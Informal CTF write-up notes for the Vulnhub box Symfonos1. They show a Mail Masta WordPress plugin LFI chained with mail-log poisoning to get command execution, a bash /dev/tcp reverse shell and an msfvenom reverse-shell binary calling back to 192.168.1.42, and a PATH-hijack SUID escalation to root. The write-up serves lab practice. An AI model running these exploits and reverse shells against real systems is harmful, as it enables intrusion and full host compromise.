helious
zeus

mounted this, and went to the /h3l105 directory

There I saw wordpress so I ran this:
```
wpscan --url <http://symfonos.local/h3l105> -e vt,tt,u,ap | tee wpscan.log
```

I found mail pasta and looked it up

be careful and done add the “-” as it will not show up in searchsploit then

```
searchsploit -x php/webapps/40290.txt
```

it seems theres an LFI there and indeed it is

however i cannot get shell with RFI alone, so i upload a cmd paramater where the fail is stoered if I can reach it with LFI. at least that's the idea. 

and indeed it works
```
<http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/../../../../../../var/mail/helios&cmd=ping%20-c%204%20192.168.1.42;id>
```
I am getting ping requsts so I have command injection now, and the SMTP + LFI trick worked great
```
GET /h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=bash+-c+'exec+bash+-i+%26>/dev/tcp/192.168.1.42/443+<%261' HTTP/1.1
Host: symfonos.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: wordpress_test_cookie=WP+Cookie+check; PHPSESSID=5cs63ujourht5julja22c0des3
Upgrade-Insecure-Requests: 1
```
and we get a shell!
```
find / -type f -perm -04000 -ls 2>/dev/null
```

we checked for suid binaries and saw cirl with some suspecious binaries it called without the full path, such as curl
```
strings /opt/statuscheck
```

our reverse shell we uploaded to /tmp
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.42 LPORT=443 -f elf > curl
```

next, lets change path environment variable and make the new curl binary executable
```
export PATH=/tmp:$PATH
chmod +x curl
```

next trigger the suid binary and enjoy ur new shell as root! :)
```
/opt/statuscheck
```

![unnamed_3745869b525d495c8cfaf9402324d0ed](docs/Attachments/_Methodology/9.%20CTF%20Boxes/Vulnhub/Symfonos1/Notes/{{notename}}-202605011742.png)
![unnamed_354de6fd94574bbb9b1d2f5aeb36102b](docs/Attachments/_Methodology/9.%20CTF%20Boxes/Vulnhub/Symfonos1/Notes/{{notename}}-202605011742-1.png)
![unnamed_e0506124e569435eb6351c88c4ea0d0e](docs/Attachments/_Methodology/9.%20CTF%20Boxes/Vulnhub/Symfonos1/Notes/{{notename}}-202605011742-2.png)
![unnamed_8570d198b6c9438fa5a4ae0caa14bdcb](docs/Attachments/_Methodology/9.%20CTF%20Boxes/Vulnhub/Symfonos1/Notes/{{notename}}-202605011742-3.png)
![unnamed_27e5d256103b4098bf9ad22c1917c43a](docs/Attachments/_Methodology/9.%20CTF%20Boxes/Vulnhub/Symfonos1/Notes/{{notename}}-202605011743.png)
![unnamed_8fa5808706644c1b9598d47aa0a8cbfa](docs/Attachments/_Methodology/9.%20CTF%20Boxes/Vulnhub/Symfonos1/Notes/{{notename}}-202605011743-1.png)
![unnamed_cf79ecad915e4e799f4dc6d646efb81f](docs/Attachments/_Methodology/9.%20CTF%20Boxes/Vulnhub/Symfonos1/Notes/{{notename}}-202605011743-2.png)
![unnamed_eea42b9c0a9e4c6aa98913638e501392](docs/Attachments/_Methodology/9.%20CTF%20Boxes/Vulnhub/Symfonos1/Notes/{{notename}}-202605011743-3.png)
![unnamed_108ad2edcbe8469b8bec9d2b247b5531](docs/Attachments/_Methodology/9.%20CTF%20Boxes/Vulnhub/Symfonos1/Notes/{{notename}}-202605011743-4.png)
![unnamed_1ddb0152cfff43718283e2cc9746c4e0](docs/Attachments/_Methodology/9.%20CTF%20Boxes/Vulnhub/Symfonos1/Notes/{{notename}}-202605011743-5.png)
![unnamed_81d10926b86f48bfab143600d25f0865](docs/Attachments/_Methodology/9.%20CTF%20Boxes/Vulnhub/Symfonos1/Notes/{{notename}}-202605011743-6.png)